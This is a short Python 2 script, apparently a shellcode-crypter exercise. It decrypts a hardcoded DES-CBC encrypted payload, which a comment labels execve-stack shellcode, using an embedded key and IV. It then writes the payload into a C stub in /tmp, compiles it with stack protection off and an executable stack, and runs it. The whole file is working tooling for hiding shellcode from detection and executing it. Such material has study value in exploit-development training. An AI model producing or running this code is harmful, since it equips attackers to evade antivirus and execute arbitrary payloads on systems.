from Crypto.Cipher import DES
import os

def decrypt_shellcode(key, shellcode, iv):

	des = DES.new(key, DES.MODE_CBC, iv)
	
	encrypted_text_formatted = shellcode.replace("\\x","")
	encrypted_text_decoded = encrypted_text_formatted.decode('hex')
	decrypted_text = des.decrypt(encrypted_text_decoded)

	print "Decrypting shellcode...\n"
	print decrypted_text
	return decrypted_text

def execute_shellcode(decrypted_shellcode):
	f = open(os.path.join("/tmp", 'shellcode.c'), 'w')
	data = """#include <stdio.h>
#include <string.h>

unsigned char code[] = "%s" ;
main()
{

	int (*ret)() = (int(*)())code;

	ret();
}\n""" % decrypted_shellcode

	f.write(data)
	f.close()
	
	print "Running it now...\n"
	os.system('gcc -fno-stack-protector -z execstack /tmp/shellcode.c -o /tmp/shellcode && /tmp/shellcode')

def main():

	key = "v5sD3GE4"  # needs to be 8 bytes
	iv = "hoqCHQE6"   # needs to be 8 bytes

	#execve-stack DES CBC encrypted shellcode
	shellcode = r"\xfb\xb5\x24\x8f\xff\xca\xb6\xcb\x13\x70\xec\xda\xb3\xde\x32\x6b\x5b\x3a\x80\x82\x37\xe9\x5d\xf7\x8b\xb2\x40\x04\xf3\x37\x01\xe0\x4a\x27\x1d\x1a\x09\xd0\x8c\x0a\xba\x8e\x13\x01\x77\xd4\x50\xab\xff\x8b\x9b\xa0\xd1\x44\xfb\xea\x69\x32\x6e\x20\x0e\x15\x29\x9b\x3e\xf4\x43\x77\x8e\x2e\x88\x2d\x39\x99\xc3\xea\xb0\x1f\xae\x48\xbe\xc9\x1e\xda\xc4\xef\x30\x45\xc7\x25\x9d\xb9\x6a\x63\x16\xda\x59\x71\x99\x28\xed\xca\xcf\xc4"
	
	decrypted_shellcode = decrypt_shellcode(key, shellcode, iv)
	execute_shellcode(decrypted_shellcode)

if __name__ == '__main__':
    main()